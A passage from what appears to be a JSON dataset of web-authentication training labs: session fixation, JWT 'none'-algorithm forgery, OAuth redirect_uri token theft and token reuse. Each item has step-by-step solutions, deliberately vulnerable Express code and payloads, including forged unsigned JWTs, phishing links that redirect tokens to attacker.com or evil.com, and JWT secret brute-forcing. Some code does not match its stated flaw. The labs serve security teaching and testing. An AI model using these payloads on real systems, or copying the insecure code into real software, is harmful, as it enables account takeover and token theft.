      "3. Replay the code in your own POST /oauth/token request to the OAuth provider to get an access_token.",
      "4. Use this access_token in the Authorization header to make requests to /userinfo or /dashboard.",
      "5. Confirm successful impersonation of the victim user and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); app.use(express.json()); app.get('/callback', async (req, res) => { const { code } = req.query; const tokenRes = await axios.post('https://auth.example.com/token', { code, client_id: 'client123', client_secret: 'secret', grant_type: 'authorization_code', redirect_uri: 'http://localhost:4002/callback' }); const accessToken = tokenRes.data.access_token; const profile = await axios.get('https://auth.example.com/userinfo', { headers: { Authorization: `Bearer ${accessToken}` } }); console.log('[DEBUG] OAuth user:', profile.data.username); res.send(`Logged in as ${profile.data.username}`); }); app.listen(4002, () => console.log('OAuth Token Substitution Lab running on http://localhost:4002'));",
    "payloads": [
      "Intercepted URL: /callback?code=leaked-code",
      "Authorization: Bearer <token_from_intercepted_code>",
      "Replay POST /token with intercepted code"
    ]
  },
  {
    "Lab scenario": "Session Fixation via Cookie Injection in REST API Login",
    "Lab Description": "The REST-based login endpoint is vulnerable to session fixation due to insecure session regeneration. The application reuses the session identifier after successful login, allowing an attacker to predetermine the victim's session ID. To solve: Fixate a session ID, trick the victim to log in using it, and access their authenticated area.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept a GET /login request and observe Set-Cookie: sessionid.",
      "Send a pre-authenticated request with a crafted session cookie: Cookie: sessionid=attackerSession123.",
      "Send POST /login with victim's credentials (known) while preserving the same session cookie.",
      "Observe that the server responds with a successful login without issuing a new Set-Cookie.",
      "Replay GET /my-account with sessionid=attackerSession123 to access the victim\u00e2\u20ac\u2122s session."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); app.use(session({ secret: 'fixationsecret', resave: false, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'pass123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = user.username; res.send('Login successful'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { if (req.session.user === 'carlos') res.send('Account page of carlos'); else res.status(403).send('Unauthorized'); }); app.listen(3000, () => console.log('Session Fixation Lab running'));",
    "payloads": [
      "Cookie: sessionid=attackerSession123",
      "POST /login {\"username\":\"carlos\",\"password\":\"pass123\"} with Cookie: sessionid=attackerSession123",
      "GET /my-account with Cookie: sessionid=attackerSession123"
    ]
  },
  {
    "Lab scenario": "JWT Tampering via None Algorithm in GraphQL Auth Header",
    "Lab Description": "The GraphQL API uses JWT for authentication but improperly validates the algorithm in the JWT header. The application accepts tokens signed with 'none', allowing tampering without a signature. To solve: Modify a valid token and access the admin dashboard with elevated privileges.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture a valid Authorization: Bearer <token> header via Postman when logged in as a low-priv user.",
      "Decode the JWT at jwt.io and modify payload to {\"role\":\"admin\"}.",
      "Modify the JWT header to {\"alg\":\"none\"} and remove the signature part.",
      "Use Burp Suite or Postman to send Authorization: Bearer <tampered-token> in GraphQL query headers.",
      "Query: { dashboard { sensitiveData } } and confirm access to admin-level data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const jwt = require('jsonwebtoken'); const app = express(); app.use(bodyParser.json()); const SECRET = 'hardcoded-secret'; app.post('/graphql', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; try { const payload = jwt.verify(token, SECRET); if (payload.role === 'admin') res.send({ data: { sensitiveData: 'Flag{jwt_admin_access}' } }); else res.send({ error: 'Insufficient rights' }); } catch (e) { res.status(403).send({ error: 'Invalid token' }); } }); app.listen(4000, () => console.log('JWT None Bypass Lab running'));",
    "payloads": [
      "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
      "Payload: {\"role\":\"admin\"}",
      "JWT token: base64(header).base64(payload). (no signature)",
      "Authorization: Bearer <tampered_token>"
    ]
  },
  {
    "Lab scenario": "OAuth Misconfiguration via Open Redirect in SOAP SSO Flow",
    "Lab Description": "The SOAP-based SSO service fails to validate the redirect_uri in OAuth flows. The attacker can manipulate the redirect URI to capture access tokens. To solve: Exploit the redirect URI flaw to leak Carlos\u00e2\u20ac\u2122s token and access the My Account page as Carlos.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Using OWASP ZAP, intercept the SOAP <LoginRequest> flow and extract the SSO URL with redirect_uri.",
      "Modify the redirect_uri to an attacker-controlled domain (e.g., https://attacker.com/oauth-leak).",
      "Send the manipulated SSO URL to Carlos (social engineering step assumed).",
      "Start a local server on attacker.com to capture the access_token from redirected request.",
      "Use the stolen token in Authorization: Bearer <token> to access /soap/MyAccount via SOAP UI."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.use(express.text({ type: 'text/xml' })); app.post('/sso', (req, res) => { const token = 'carlos-token-123'; const redirect = req.query.redirect_uri || 'https://trusted.app/account'; res.redirect(`${redirect}?access_token=${token}`); }); app.post('/soap/MyAccount', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (token === 'carlos-token-123') res.send('<Account>Welcome carlos</Account>'); else res.status(403).send('<Error>Unauthorized</Error>'); }); app.listen(5000, () => console.log('OAuth Redirect Lab running'));",
    "payloads": [
      "SSO URL: /sso?redirect_uri=https://attacker.com/oauth-leak",
      "Intercepted redirect: https://attacker.com/oauth-leak?access_token=carlos-token-123",
      "Authorization: Bearer carlos-token-123 in SOAP Header"
    ]
  },
  {
    "Lab scenario": "Session Fixation in GraphQL Authentication Flow",
    "Lab Description": "This application's GraphQL-based login mutation uses a predictable session token before user authentication, which is not regenerated after login. The application accepts a session token passed via a cookie. To solve: hijack Carlos\u00e2\u20ac\u2122s session using a fixed token and access the /account endpoint.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the GraphQL login mutation and notice session token remains unchanged across login attempts.",
      "Send multiple pre-authentication requests to record how session tokens are generated and identify predictable pattern (e.g., timestamp-based).",
      "Craft a fixation attack by sending a login mutation with the victim\u00e2\u20ac\u2122s credentials using a fixed `sessionid` cookie value.",
      "Login with your own credentials while setting the same fixed session ID cookie, causing the server to bind your request to Carlos\u00e2\u20ac\u2122s session.",
      "Access /account using the fixed session cookie to confirm hijacked session and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'qwerty123' }]; app.post('/graphql', (req, res) => { const { query, variables } = req.body; const token = req.cookies.sessionid || Date.now().toString(); res.cookie('sessionid', token); if (query.includes('mutation Login')) { const { username, password } = variables; const user = users.find(u => u.username === username && u.password === password); if (user) { return res.send({ data: { login: true } }); } } res.status(403).send({ error: 'Unauthorized' }); }); app.get('/account', (req, res) => { if (req.cookies.sessionid === 'FIXEDSESSIONCARLOS') return res.send('Account page for carlos'); res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('GraphQL Session Fixation Lab running'));",
    "payloads": [
      "Cookie: sessionid=FIXEDSESSIONCARLOS",
      "GraphQL Mutation: { \"query\": \"mutation Login($username: String!, $password: String!) { login(username: $username, password: $password) }\", \"variables\": { \"username\": \"carlos\", \"password\": \"qwerty123\" } }"
    ]
  },
  {
    "Lab scenario": "JWT Bypass via None Algorithm in REST Login Flow",
    "Lab Description": "The REST login system uses JWTs for session authentication but fails to validate the algorithm used. The server accepts tokens signed with 'none' algorithm and does not verify the signature. To solve: craft a fake JWT token impersonating Carlos and access the protected /dashboard endpoint.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to intercept the login request and capture a JWT issued after login.",
      "Decode the token using jwt.io and inspect the algorithm and payload structure.",
      "Modify the token's header to use 'alg':'none' and replace the payload with `{ \"user\": \"carlos\" }`.",
      "Remove the signature section and re-encode the token using base64url encoding.",
      "Send a GET /dashboard request with Authorization: Bearer <crafted_token> and access Carlos's dashboard."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = [{ username: 'carlos', password: 'letmein' }]; app.use(express.json()); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(403).send('Invalid'); const token = jwt.sign({ user: username }, 'insecurekey', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/dashboard', (req, res) => { const auth = req.headers.authorization?.split(' ')[1]; try { const payload = jwt.verify(auth, 'insecurekey', { algorithms: ['HS256', 'none'] }); if (payload.user === 'carlos') return res.send('Carlos dashboard accessed'); } catch { return res.status(401).send('Unauthorized'); } res.status(403).send('Forbidden'); }); app.listen(4000, () => console.log('JWT None Algorithm Lab running'));",
    "payloads": [
      "Header: { \"alg\": \"none\", \"typ\": \"JWT\" }",
      "Payload: { \"user\": \"carlos\" }",
      "Authorization: Bearer <base64url(header)>.base64url(payload)."
    ]
  },
  {
    "Lab scenario": "OAuth Redirect URI Manipulation in Authorization Server",
    "Lab Description": "This application integrates OAuth with a third-party provider but fails to validate exact redirect URIs. An attacker can manipulate the redirect_uri to capture authorization codes. To solve: intercept an OAuth authorization code issued to Carlos and redeem it to access his profile.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to proxy and intercept the initial authorization request to the /oauth/authorize endpoint.",
      "Modify the `redirect_uri` parameter to an attacker-controlled domain while preserving the domain root.",
      "Send the manipulated link to Carlos (simulated via forced browsing or redirect script).",
      "Receive the leaked authorization code on your server (set up listener on attacker.com).",
      "Use the captured code in a POST /oauth/token request and gain access to Carlos's access token. Use it to retrieve /profile."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const tokens = {}; const codes = {}; app.get('/oauth/authorize', (req, res) => { const { client_id, redirect_uri, state } = req.query; const code = 'authcode-carlos'; codes[code] = 'carlos'; res.redirect(`${redirect_uri}?code=${code}&state=${state}`); }); app.post('/oauth/token', express.urlencoded({ extended: true }), (req, res) => { const { code } = req.body; if (codes[code]) { const token = 'token-carlos'; tokens[token] = codes[code]; return res.json({ access_token: token }); } res.status(400).send('Invalid code'); }); app.get('/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (tokens[token] === 'carlos') return res.send('Profile for carlos'); res.status(403).send('Invalid token'); }); app.listen(4000, () => console.log('OAuth Redirect URI Lab running'));",
    "payloads": [
      "GET /oauth/authorize?client_id=app&redirect_uri=https://attacker.com/callback&state=xyz",
      "Leaked code: authcode-carlos",
      "POST /oauth/token with body: code=authcode-carlos",
      "Authorization: Bearer token-carlos"
    ]
  },
  {
    "Lab scenario": "GraphQL JWT claim manipulation in token-based authentication",
    "Lab Description": "The application uses JWT-based authentication within its GraphQL API. JWT tokens are signed using a symmetric secret that can be brute-forced. The application does not verify claims properly during GraphQL authorization. To solve: Gain admin access and query sensitive user data through GraphQL introspection.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use OWASP ZAP to inspect the GraphQL endpoint at /graphql and identify the 'Authorization: Bearer <token>' header used in requests.",
      "2. Capture your JWT using Burp Suite and decode it to examine claims. Note weak 'alg' and predictable structure.",
      "3. Use `jwt_tool.py` or Postman to brute-force the JWT secret with a common wordlist (e.g., rockyou.txt).",
      "4. Modify the decoded JWT claim to { \"role\": \"admin\" }, re-sign with cracked secret, and re-encode.",
      "5. Send the forged JWT in Authorization header to GraphQL endpoint, and use introspection query to extract hidden schema and access sensitive fields."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const { graphqlHTTP } = require('express-graphql'); const schema = require('./schema'); const app = express(); const SECRET = 'mysecret'; app.use('/graphql', (req, res, next) => { const token = req.headers['authorization']?.split(' ')[1]; try { const decoded = jwt.verify(token, SECRET); req.user = decoded; next(); } catch (err) { res.status(401).send('Invalid token'); } }); app.use('/graphql', graphqlHTTP(req => ({ schema, graphiql: true, context: { user: req.user } }))); app.listen(4000, () => console.log('JWT GraphQL Lab running on port 4000'));",
    "payloads": [
      "{ \"alg\": \"HS256\", \"typ\": \"JWT\" }.{ \"role\": \"admin\", \"user\": \"carlos\" }",
      "JWT signed with cracked secret: 'mysecret'",
      "GraphQL introspection: { __schema { types { name fields { name } } } }"
    ]
  },
  {
    "Lab scenario": "Session fixation via unvalidated session token reuse in REST login",
    "Lab Description": "The REST-based login system fails to invalidate old session tokens after successful login. Attacker can fix a known session ID and trick victim into using it. To solve: Fix a session ID, perform login with victim credentials, and access their account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. In Burp Suite, register your own user and intercept the /login POST request. Note the Set-Cookie header assigns 'session_id'.",
      "2. Craft a phishing link that includes the known session_id in a cookie and trick the victim into logging in.",
      "3. Use OWASP ZAP to confirm the victim reuses the attacker-fixed session ID by monitoring traffic to /account.",
      "4. Replay the session using the fixed session ID and access victim\u00e2\u20ac\u2122s authenticated area.",
      "5. Validate lab completion by accessing /account with active session."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'hunter2' }]; const sessions = {}; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const sid = req.cookies['session_id'] || Math.random().toString(36).slice(2); sessions[sid] = username; res.cookie('session_id', sid); res.send('Login successful'); }); app.get('/account', (req, res) => { const user = sessions[req.cookies['session_id']]; if (!user) return res.status(403).send('Not logged in'); res.send(`Welcome ${user}`); }); app.listen(4000, () => console.log('Session Fixation Lab running on port 4000'));",
    "payloads": [
      "Phishing link with cookie: session_id=attackerFixedID",
      "Burp Suite to capture fixed session reuse",
      "GET /account with session_id=attackerFixedID"
    ]
  },
  {
    "Lab scenario": "OAuth implicit flow misconfiguration in third-party login integration",
    "Lab Description": "The app uses OAuth implicit grant flow to log users in via a third-party provider. The redirect URI is vulnerable to open redirect abuse and the state parameter is not validated. To solve: Steal an access token from a victim user using a malicious redirect.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to inspect the OAuth login URL. Identify absence of state parameter and use of redirect_uri.",
      "2. Modify redirect_uri to point to your server (e.g., https://evil.com/capture) using Burp Repeater.",
      "3. Send phishing link with modified OAuth URL to the victim (simulate with curl).",
      "4. Capture access_token in your listener (e.g., using Express server with query logging).",
      "5. Replay token in Authorization: Bearer header to /profile endpoint and access victim account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const request = require('request'); const app = express(); app.get('/oauth/callback', (req, res) => { const { access_token } = req.query; if (!access_token) return res.status(400).send('No token'); request.get({ url: 'https://oauth.example.com/userinfo', headers: { Authorization: `Bearer ${access_token}` }}, (err, resp, body) => { if (err) return res.status(500).send('OAuth Error'); res.send(`User Info: ${body}`); }); }); app.listen(4000, () => console.log('OAuth Redirect Lab running on port 4000'));",
    "payloads": [
      "OAuth phishing link: https://auth.app/oauth?client_id=xyz&redirect_uri=https://evil.com/capture&response_type=token",
      "Redirect server log to capture: GET /capture#access_token=abc123",
      "Replay token: Authorization: Bearer abc123"
    ]
  },
  {
    "Lab scenario": "Session Fixation via SOAP Login Token Mismanagement in Legacy Auth Service",
    "Lab Description": "The application uses a legacy SOAP-based authentication API that improperly binds session tokens before credential verification. The application generates a session cookie as soon as the login page loads, and this session is not invalidated after a successful login. To solve: Fixate a session ID before login, use it to authenticate as the victim, and access their private profile.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Using Burp Suite, intercept the initial GET request to /login and capture the Set-Cookie header establishing a session token.",
      "2. With OWASP ZAP, replay the captured request in a new browser session and confirm session reuse prior to authentication.",
      "3. Use Postman to send a crafted SOAP login request using your own credentials and observe that session ID does not change post-login.",
      "4. Replay the same pre-login session ID, but this time POST the victim's credentials via the SOAP envelope, binding the fixed session to them.",
      "5. Use the fixed session ID to access the /soap-profile endpoint and confirm victim's data is shown."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const cookieParser = require('cookie-parser'); app.use(cookieParser()); app.use(bodyParser.text({ type: 'application/soap+xml' })); const sessions = {}; const users = [{ username: 'victim', password: 'vpass', profile: 'Sensitive Data' }]; app.get('/login', (req, res) => { const sid = Math.random().toString(36).substring(2); res.cookie('SID', sid); res.send('<loginPage/>'); }); app.post('/soap-auth', (req, res) => { const match = req.body.match(/<username>(.*?)<\\/username>.*<password>(.*?)<\\/password>/); if (!match) return res.status(400).send('Bad Request'); const [_, username, password] = match; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(403).send('Auth Failed'); sessions[req.cookies.SID] = username; res.send('<authSuccess/>'); }); app.get('/soap-profile', (req, res) => { const user = sessions[req.cookies.SID]; if (!user) return res.status(403).send('Forbidden'); res.send('Profile data for ' + user); }); app.listen(3000);",
    "payloads": [
      "<soap><username>victim</username><password>vpass</password></soap>",
      "GET /login HTTP/1.1 with pre-captured Set-Cookie: SID",
      "Replay /soap-profile with fixed SID"
    ]
  },
  {
    "Lab scenario": "JWT Authentication Bypass via 'none' Algorithm in GraphQL Login",
    "Lab Description": "This application uses JWTs for user session management via GraphQL login mutation. The backend fails to validate the algorithm field of the JWT. To solve: Tamper with a valid JWT and forge one using 'none' algorithm to impersonate the admin user and access the admin dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Log in using your own credentials and capture the Authorization: Bearer token using Burp Suite.",
      "2. Decode the JWT using jwt.io or Postman Pre-request Scripts to inspect the structure.",
      "3. Modify the token payload to { \"username\": \"admin\" } and change the header to { \"alg\": \"none\" }.",
      "4. Remove the signature part and craft the token as header.payload (omit signature).",
      "5. Use OWASP ZAP to replay the /graphql query to fetch admin data using the forged JWT in Authorization header."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const jwt = require('jsonwebtoken'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'admin', role: 'admin' }, { username: 'user1', role: 'user' }]; app.post('/graphql', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (!decoded) return res.status(401).send('Invalid token'); const user = users.find(u => u.username === decoded.payload.username); if (!user) return res.status(403).send('Unauthorized'); res.send({ data: `Welcome ${user.username}, role: ${user.role}` }); }); app.listen(4000);",
    "payloads": [
      "{ \"alg\": \"none\" }.{ \"username\": \"admin\" }.",
      "Authorization: Bearer [forged_jwt]",
      "POST /graphql { query: \"{me{role}}\" }"
    ]
  },
  {
    "Lab scenario": "OAuth Implicit Flow Token Theft via Redirect URI Manipulation in Login Flow",
    "Lab Description": "The application uses an implicit OAuth flow and accepts user-defined redirect URIs without proper validation. The access token is leaked via the URI fragment. To solve: Inject a malicious redirect URI to steal the access token of the victim and access their account.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "1. Use Burp Suite to intercept the /oauth/authorize request and locate the redirect_uri parameter.",
      "2. Modify the redirect_uri to point to your own server or exploit server (e.g., https://attacker.com/callback#token).",
      "3. Send the phishing link to the victim and simulate a login from their end.",
      "4. Capture the access token from the URI fragment sent to your server.",
      "5. Replay a GET /account request using Authorization: Bearer <captured_token> to access the victim's data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const crypto = require('crypto'); const users = [{ username: 'victim', token: 'abcd1234token' }]; app.get('/oauth/authorize', (req, res) => { const { redirect_uri } = req.query; const token = 'abcd1234token'; res.redirect(`${redirect_uri}#access_token=${token}`); }); app.get('/account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const user = users.find(u => u.token === token); if (!user) return res.status(403).send('Invalid token'); res.send(`Welcome ${user.username}`); }); app.listen(5000);",
    "payloads": [
      "https://vulnsite.com/oauth/authorize?client_id=abc&redirect_uri=https://attacker.com/callback",
      "Authorization: Bearer abcd1234token",
      "GET /account"
    ]
  },
  {
    "Lab scenario": "Session fixation via unvalidated session reuse in SOAP login endpoint",
    "Lab Description": "The application's SOAP-based login mechanism incorrectly reuses session identifiers without regenerating them upon authentication. The session ID can be pre-set and persists across login boundaries. The application stores session tokens before authentication and promotes them post-login without invalidation. To solve: Hijack a victim's session by planting a known session ID and force them to authenticate.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept an unauthenticated login request and observe the Set-Cookie header providing a session ID.",
      "Send a crafted SOAP login request with a fixed session ID (e.g., SESSIONID=attackerSession) and confirm it gets reused upon successful login.",
      "Trick the victim into visiting a page that sets the SESSIONID=attackerSession via client-side JavaScript or HTTP header injection.",
      "Once the victim logs in, reuse the known session ID to access their authenticated session.",
      "Verify by visiting the /soap/account-info endpoint with the hijacked session ID and confirm access to the victim\u00e2\u20ac\u2122s data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const session = require('express-session'); const app = express(); app.use(bodyParser.text({ type: 'text/xml' })); app.use(session({ secret: 'soap-secret', resave: true, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'pass123' }]; app.post('/soap-login', (req, res) => { const xml = req.body; const match = xml.match(/<username>(.*?)<\\/username><password>(.*?)<\\/password>/); if (match) { const [_, user, pass] = match; const u = users.find(u => u.username === user && u.password === pass); if (u) { req.session.user = u.username; res.send(`<response>Welcome ${u.username}</response>`); return; } } res.status(403).send('<response>Login failed</response>'); }); app.get('/soap/account-info', (req, res) => { if (req.session.user) return res.send(`Account Info: ${req.session.user}`); res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('SOAP Session Fixation lab running on port 4000'));",
    "payloads": [
      "SESSIONID=attackerSession",
      "<?xml version='1.0'?><login><username>carlos</username><password>pass123</password></login>",
      "Access /soap/account-info with SESSIONID=attackerSession"
    ]
  },
  {
    "Lab scenario": "JWT signature confusion with none algorithm in GraphQL login",
    "Lab Description": "The application uses a JWT token for authentication and accepts tokens passed via a GraphQL mutation. The backend does not enforce algorithm constraints, allowing a forged token using the `none` algorithm. The application accepts unsigned tokens if the header specifies 'alg':'none'. To solve: Forge a valid token for the user 'carlos' and access the GraphQL-protected dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to inspect the GraphQL login mutation and observe the JWT returned after login.",
      "Copy the token and decode it using jwt.io or Burp Decoder. Note the payload structure and claims (e.g., { 'user':'wiener' }).",
      "Craft a forged token with header { 'alg':'none' } and payload { 'user':'carlos' } without signature.",
      "Replace the Authorization header with: Bearer <forged_token> and send a GraphQL query to access protected resources.",
      "Confirm success by querying userData { email } for 'carlos' and seeing valid output."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'password' }]; app.post('/graphql', (req, res) => { const { query, variables } = req.body; if (query.includes('login')) { const user = users.find(u => u.username === variables.username && u.password === variables.password); if (user) { const token = jwt.sign({ user: user.username }, 'jwt-secret', { algorithm: 'HS256' }); return res.json({ data: { login: token } }); } return res.status(403).send('Login failed'); } if (req.headers.authorization) { const token = req.headers.authorization.split(' ')[1]; try { const decoded = jwt.verify(token, 'jwt-secret'); if (decoded.user) return res.json({ data: { userData: { email: decoded.user + '@lab.local' } } }); } catch (e) { return res.status(403).send('Invalid token'); } } res.status(400).send('Bad request'); }); app.listen(4000, () => console.log('JWT None Algorithm lab running on port 4000'));",
    "payloads": [
      "Header: { \"alg\": \"none\" }",
      "Payload: { \"user\": \"carlos\" }",
      "JWT: base64url(header).base64url(payload).",
      "Authorization: Bearer <forged_token>"
    ]
  },
  {
    "Lab scenario": "OAuth client misconfiguration leads to token reuse",
    "Lab Description": "The application relies on a third-party OAuth 2.0 provider for authentication. However, it reuses access tokens across clients without verifying the `aud` or `client_id` fields. This enables attackers to use access tokens from other apps to impersonate users. To solve: Acquire a valid OAuth token from your test app and reuse it on this site to gain access to Carlos\u00e2\u20ac\u2122s account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to intercept the login process and observe the OAuth flow with the Authorization header.",
      "Identify the lack of token validation for `client_id` or audience claim by submitting a token from a separate registered app.",
      "Obtain a valid OAuth access token from your own app using client credentials grant or implicit flow.",
      "Send a request to /oauth/profile with Authorization: Bearer <your_token>.",
      "Observe that the server accepts the token and returns user data, indicating the client identity wasn't verified. Change sub to carlos and re-sign if applicable."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); app.get('/oauth/profile', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; try { const decoded = jwt.decode(token); // no audience or client_id checks if (decoded && decoded.sub) return res.send(`User profile for ${decoded.sub}`); return res.status(403).send('Invalid token structure'); } catch (e) { return res.status(403).send('Token error'); } }); app.listen(4000, () => console.log('OAuth Token Reuse lab running on port 4000'));",
    "payloads": [
      "Bearer <access_token_from_attacker_app>",
      "JWT payload: { \"sub\": \"carlos\", \"aud\": \"attacker-app\" }",
      "No verification of client_id in backend"
    ]
  },
  {
    "Lab scenario": "Session Fixation via Cookie Injection in OAuth Callback Handler",
    "Lab Description": "This lab's OAuth callback implementation is vulnerable to session fixation. The application does not regenerate the session upon login via OAuth. Instead, it continues using any pre-authentication session value. To solve: Fixate a session ID, then log in as the victim via OAuth, and hijack their session using the fixed cookie.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite's Proxy to initiate a login flow and capture a session cookie before any authentication.",
      "2. Observe that the session ID remains unchanged after logging in with your own account via OAuth.",
      "3. Send the GET /auth/callback request to Burp Repeater and manually inject the pre-auth session ID as a cookie.",
      "4. Use Burp Collaborator or Intercept to force the victim to visit a crafted OAuth URL that preserves the fixed session cookie.",
      "5. After victim login, reuse the fixed session cookie to access their account dashboard."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 's3cr3t', resave: false, saveUninitialized: true })); app.get('/login', (req, res) => { const authUrl = 'https://oauth.provider.com/auth?client_id=123&redirect_uri=http://localhost:4000/auth/callback'; res.redirect(authUrl); }); app.get('/auth/callback', (req, res) => { const userInfo = { username: 'carlos' }; req.session.user = userInfo; console.log('[DEBUG] Auth callback session:', req.session); res.redirect('/dashboard'); }); app.get('/dashboard', (req, res) => { if (!req.session.user) return res.status(401).send('Unauthorized'); res.send('Welcome to your dashboard, ' + req.session.user.username); }); app.listen(4000, () => console.log('OAuth Session Fixation Lab running'));",
    "payloads": [
      "Set-Cookie: connect.sid=sess:fixed123",
      "https://labsite.com/auth/callback?code=xyz (with injected session ID)",
      "Burp Collaborator + social engineering redirect to /auth/callback"
    ]
  },
  {
    "Lab scenario": "JWT None Algorithm Bypass in GraphQL Login API",
    "Lab Description": "This lab uses JSON Web Tokens to protect user sessions. However, the backend incorrectly allows tokens signed with the 'none' algorithm. To solve: Forge a JWT with 'alg':'none' and impersonate the victim user to access their GraphQL profile.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Postman to perform a valid login and retrieve your JWT from the Authorization header.",
      "2. Decode the JWT in jwt.io or Burp Decoder and observe the algorithm field.",
      "3. Replace the JWT header with {\"alg\":\"none\",\"typ\":\"JWT\"} and payload with {\"username\":\"carlos\"}.",
      "4. Remove the signature completely and send the token via Authorization: Bearer header to /graphql.",
      "5. Query the victim\u00e2\u20ac\u2122s profile using: { userProfile { username, email, balance } }"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const SECRET = 'mysecretkey'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, SECRET, { algorithm: 'HS256' }); console.log('[DEBUG] Issued JWT:', token); res.json({ token }); }); app.post('/graphql', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload && payload.header.alg === 'none') { const user = { username: req.body.query.includes('carlos') ? 'carlos' : 'anonymous' }; return res.json({ data: { userProfile: { username: user.username, email: user.username + '@example.com', balance: 100 } } }); } try { const verified = jwt.verify(token, SECRET); res.json({ data: { userProfile: { username: verified.username, email: verified.username + '@example.com', balance: 100 } } }); } catch (err) { res.status(401).send('Invalid token'); } }); app.listen(4000, () => console.log('JWT None Bypass Lab running'));",
    "payloads": [
      "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "{ userProfile { username, email, balance } }",
      "Authorization: Bearer <none-alg-token>"
    ]
  },
  {
    "Lab scenario": "SOAP API Key Leakage via Verbose Debugging in MFA Bypass",
    "Lab Description": "This lab uses a SOAP API for multi-factor authentication. The application logs sensitive API keys in verbose mode. By inducing an error during MFA verification, an attacker can leak the victim\u00e2\u20ac\u2122s API key. To solve: Trigger the debug message, extract the key, and bypass MFA for the victim.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use OWASP ZAP to intercept the SOAP MFA login request and replay it with a malformed payload.",
      "2. Analyze the HTTP 500 error response containing the verbose debug trace leaking 'apiKey' for the victim.",
      "3. Replay the correct SOAP request with the leaked API key and valid credentials to bypass MFA.",
